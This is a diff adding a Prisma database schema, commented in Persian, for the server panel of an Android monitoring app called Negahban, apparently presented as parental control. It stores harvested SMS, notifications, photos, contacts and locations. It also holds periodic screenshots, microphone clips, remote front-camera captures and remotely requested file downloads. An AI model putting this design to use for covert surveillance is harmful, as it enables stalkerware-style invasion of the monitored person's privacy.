@@ -1,0 +1,264 @@
+// اسکیمای دیتابیس پنل نگهبان
+// دستگاه‌های متصل (گوشی‌هایی که اپ نگهبان روی آن‌ها نصب است)
+
+generator client {
+  provider = "prisma-client-js"
+}
+
+datasource db {
+  provider = "sqlite"
+  // مقدار این متغیر در محیط Railway توسط اسکریپت start.sh به file:/data/negahban.db
+  // تنظیم می‌شود (اگر کاربر خودش تنظیم نکرده باشد). در محیط dev لوکال می‌توانید
+  // فایل .env با DATABASE_URL=file:./dev.db بسازید.
+  url = env("DATABASE_URL")
+}
+
+model Device {
+  id             String       @id @default(cuid())
+  name           String
+  model          String?
+  androidVersion String?
+  appVersion     String?
+  token          String       @unique
+  battery        Int?
+  lastSeenAt     DateTime?
+  lastSyncAt     DateTime?
+  createdAt      DateTime     @default(now())
+  // پایش صفحه: روشن/خاموش بودن گرفتن اسکرین‌شات هر ۱۰ ثانیه
+  screenMonitorEnabled Boolean @default(false)
+  screenMonitorStartedAt DateTime?
+  // ضبط صدا: روشن/خاموش بودن ضبط ۱۰ ثانیه صدا
+  audioMonitorEnabled Boolean @default(false)
+  audioMonitorStartedAt DateTime?
+  // آیا سرویس Accessibility روی گوشی فعال است؟ (پایش صفحه فقط با Accessibility کار می‌کند)
+  // این فیلد در هر همگام‌سازی توسط دستگاه به‌روز می‌شود
+  accessibilityEnabled Boolean @default(false)
+  // آخرین موقعیت گزارش‌شده (برای نقشه پنل)
+  locLat         Float?
+  locLng         Float?
+  locAccuracy    Float?
+  locProvider    String?
+  locAt          DateTime?
+  apps           DeviceApp[]
+  usage          UsageEntry[]
+  events         EventLog[]
+  sms            SmsMessage[]
+  notifications  NotificationItem[]
+  photos         PhotoEntry[]
+  contacts       ContactEntry[]
+  commands       DeviceCommand[]
+  captures       CapturePhoto[]
+  pings          LocationPing[]
+  screens        ScreenCapture[]
+  audioClips     AudioClip[]
+  fileRequests   FileRequest[]
+}
+
+// لیست برنامه‌های نصب‌شده روی دستگاه
+model DeviceApp {
+  id          String   @id @default(cuid())
+  deviceId    String
+  packageName String
+  label       String
+  controlled  Boolean  @default(false)
+  updatedAt   DateTime @updatedAt
+  device      Device   @relation(fields: [deviceId], references: [id], onDelete: Cascade)
+
+  @@unique([deviceId, packageName])
+}
+
+// مصرف روزانه هر برنامه بر حسب دقیقه
+model UsageEntry {
+  id          String   @id @default(cuid())
+  deviceId    String
+  day         DateTime // نیمه‌شبِ روزِ گزارش‌شده توسط دستگاه
+  packageName String
+  minutes     Int
+  device      Device   @relation(fields: [deviceId], references: [id], onDelete: Cascade)
+
+  @@unique([deviceId, day, packageName])
+}
+
+// رویدادها (ثبت‌نام، همگام‌سازی و ...)
+model EventLog {
+  id        String   @id @default(cuid())
+  deviceId  String?
+  type      String // REGISTER | SYNC | PAIR | ERROR
+  message   String
+  createdAt DateTime @default(now())
+  device    Device?  @relation(fields: [deviceId], references: [id], onDelete: Cascade)
+}
+
+// پیامک‌های گوشی که توسط اپ ارسال شده‌اند
+model SmsMessage {
+  id       String   @id @default(cuid())
+  deviceId String
+  smsId    Int // شناسه پیامک در content provider گوشی
+  address  String
+  body     String
+  type     Int // 1=دریافتی، 2=ارسالی، 3=پیش‌نویس، ...
+  at       DateTime
+  device   Device   @relation(fields: [deviceId], references: [id], onDelete: Cascade)
+
+  @@unique([deviceId, smsId])
+  @@index([deviceId, at])
+}
+
+// اعلان‌های ضبط‌شده توسط سرویس گوشِ اعلان‌های نگهبان
+model NotificationItem {
+  id          String   @id @default(cuid())
+  deviceId    String
+  localId     Int
+  packageName String
+  title       String
+  text        String
+  at          DateTime
+  device      Device   @relation(fields: [deviceId], references: [id], onDelete: Cascade)
+
+  @@unique([deviceId, localId])
+  @@index([deviceId, at])
+}
+
+// عکس‌های گالری + thumbnail فشرده (JPEG)
+model PhotoEntry {
+  id       String    @id @default(cuid())
+  deviceId String
+  mediaId  Int
+  takenAt  DateTime?
+  size     Int?
+  bucket   String?
+  thumb    Bytes?
+  device   Device    @relation(fields: [deviceId], references: [id], onDelete: Cascade)
+
+  @@unique([deviceId, mediaId])
+  @@index([deviceId, takenAt])
+}
+
+// مخاطبین گوشی (لیست کامل هر بار ارسال و جایگزین می‌شود)
+model ContactEntry {
+  id       String @id @default(cuid())
+  deviceId String
+  name     String
+  phones   String // شماره‌ها با «، » از هم جدا شده‌اند
+  device   Device @relation(fields: [deviceId], references: [id], onDelete: Cascade)
+
+  @@index([deviceId, name])
+}
+
+// کد جفت‌سازی برای اتصال دستگاه جدید
+model PairingCode {
+  id        String    @id @default(cuid())
+  code      String    @unique
+  note      String?
+  used      Boolean   @default(false)
+  deviceId  String?
+  createdAt DateTime  @default(now())
+  expiresAt DateTime
+  usedAt    DateTime?
+}
+
+// فرمان‌های والد برای دستگاه (فعلاً فقط عکس‌برداری از کاربر گوشی)
+model DeviceCommand {
+  id        String          @id @default(cuid())
+  deviceId  String
+  type      String // CAPTURE
+  status    String          @default("PENDING") // PENDING | DONE
+  createdAt DateTime        @default(now())
+  doneAt    DateTime?
+  device    Device          @relation(fields: [deviceId], references: [id], onDelete: Cascade)
+  captures  CapturePhoto[]
+}
+
+// عکس دوربین جلو (نتیجه فرمان عکس‌برداری) — JPEG فشرده
+model CapturePhoto {
+  id        String          @id @default(cuid())
+  deviceId  String
+  commandId String?
+  jpeg      Bytes
+  takenAt   DateTime
+  createdAt DateTime        @default(now())
+  device    Device          @relation(fields: [deviceId], references: [id], onDelete: Cascade)
+  command   DeviceCommand?  @relation(fields: [commandId], references: [id])
+
+  @@index([deviceId, takenAt])
+}
+
+// تاریخچه موقعیت‌ها (حداکثر ۱۰۰ نقطه‌ی آخر هر دستگاه نگه داشته می‌شود)
+model LocationPing {
+  id        String   @id @default(cuid())
+  deviceId  String
+  lat       Float
+  lng       Float
+  accuracy  Float?
+  provider  String?
+  at        DateTime
+  device    Device   @relation(fields: [deviceId], references: [id], onDelete: Cascade)
+
+  @@index([deviceId, at])
+}
+
+// اسکرین‌شات‌های دوره‌ای صفحه‌ی گوشی (هر ۱۰ ثانیه وقتی پایش صفحه فعال است)
+// JPEG فشرده (معمولاً ۳۰-۸۰ کیلوبایت در هر عکس)
+model ScreenCapture {
+  id        String   @id @default(cuid())
+  deviceId  String
+  jpeg      Bytes
+  takenAt   DateTime
+  createdAt DateTime @default(now())
+  device    Device   @relation(fields: [deviceId], references: [id], onDelete: Cascade)
+
+  @@index([deviceId, takenAt])
+}
+
+/**
+ * درخواست فایل از طرف ادمین به دستگاه:
+ *   type="list"     — ادمین می‌خواهد محتوای یک مسیر را ببیند. دستگاه لیست
+ *                     فایل‌ها و پوشه‌ها را در `listing` (JSON) ذخیره می‌کند.
+ *   type="download" — ادمین می‌خواهد یک فایل را دانلود کند. دستگاه فایل را
+ *                     chunk به chunk در `content` می‌نویسد (بدون محدودیت حجم).
+ *
+ * status: PENDING (منتظر پردازش توسط گوشی) → DONE (تکمیل شده) / ERROR
+ */
+model FileRequest {
+  id        String   @id @default(cuid())
+  deviceId  String
+  type      String  // "list" | "download"
+  path      String  // مسیر روی گوشی (مثلاً /storage/emulated/0/Downloads)
+  status    String  @default("PENDING") // PENDING | DONE | ERROR
+  error     String?
+  createdAt DateTime @default(now())
+  doneAt    DateTime?
+
+  // برای type=list: لیست فایل‌ها به‌صورت JSON
+  //   [{name, path, isDir, size, modifiedAt, mimeType}]
+  listing   String?
+
+  // برای type=download: محتوای فایل به‌صورت باینری (بعد از اتمام همه‌ی chunkها)
+  content   Bytes?
+  fileName  String?  // نام فایل اصلی (برای download header)
+  mimeType  String?
+  fileSize  Int?     // کل حجم فایل (بایت)
+
+  // شمارش chunkها برای پیشرفت
+  chunksTotal Int @default(0)
+  chunksReceived Int @default(0)
+
+  device    Device   @relation(fields: [deviceId], references: [id], onDelete: Cascade)
+
+  @@index([deviceId, status])
+  @@index([deviceId, createdAt])
+}
+
+// قطعات صوتی ضبط‌شده از میکروفون گوشی (هر ۱۰ ثانیه وقتی ضبط صدا فعال است)
+model AudioClip {
+  id         String   @id @default(cuid())
+  deviceId   String
+  audio      Bytes
+  mimeType   String
+  durationSec Int     @default(10)
+  recordedAt DateTime
+  createdAt  DateTime @default(now())
+  device     Device   @relation(fields: [deviceId], references: [id], onDelete: Cascade)
+
+  @@index([deviceId, recordedAt])
+}
